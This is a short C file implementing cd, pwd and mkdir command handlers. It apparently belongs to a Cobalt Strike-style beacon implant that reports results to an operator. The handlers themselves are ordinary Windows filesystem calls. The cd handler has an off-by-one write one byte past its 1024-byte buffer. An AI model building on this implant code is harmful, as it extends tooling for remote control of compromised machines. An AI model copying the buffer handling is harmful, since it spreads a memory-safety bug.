#include "pch.h"

#include "filesystem.h"

#include "beacon.h"

void FilesystemCd(char* buffer, int length)
{
	char path[1024];

	if (length > sizeof(path))
		return;

	strncpy(path, buffer, length);
	path[length] = '\0';

	SetCurrentDirectoryA(path);
}

void FilesystemPwd()
{
	char data[2048];
	int length = GetCurrentDirectoryA(sizeof(data), data);
	if (length == 0)
		return;
	BeaconOutput(CALLBACK_PWD, data, length);
}

void FilesystemMkdir(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	char* path = BeaconDataStringPointerCopy(&parser, 0x4000);

	// Create the directory
	CreateDirectoryA(path, NULL);

	free(path);
}